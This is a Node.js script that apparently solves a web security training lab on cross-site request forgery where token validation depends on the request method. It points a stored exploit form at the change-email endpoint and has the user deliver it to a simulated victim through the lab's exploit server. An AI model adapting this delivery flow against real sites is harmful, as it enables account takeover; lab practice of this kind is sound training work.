import { parse } from "node-html-parser";
import { ExploitServer } from "../../../utils/exploitServer.js";
import { getFileContent } from "../../../utils/getFileContent.js";
import { getParsedInput } from "../../../utils/getParsedInput.js";
import { runTasks } from "../../../utils/runTasks.js";

const { url, httpClient } = getParsedInput({
  description: "Lab: CSRF where token validation depends on request method",
  proxy: true,
});

async function task() {
  let exploit = await getFileContent("./exploit.html");
  const changeEmailUrl = url + "my-account/change-email";
  exploit = replaceActionAttribute(exploit, changeEmailUrl);

  const exploitServer = await ExploitServer.create(url, httpClient);
  exploitServer.storeExploit(exploit);

  console.log(`To solve the lab:
  1. Visit ${exploitServer.url}
  2. Press "Deliver exploit to victim" button`);
}

function replaceActionAttribute(html, url) {
  const parsedHtml = parse(html);
  parsedHtml.querySelector("form").setAttribute("action", url);

  return parsedHtml.toString();
}

runTasks([task]);
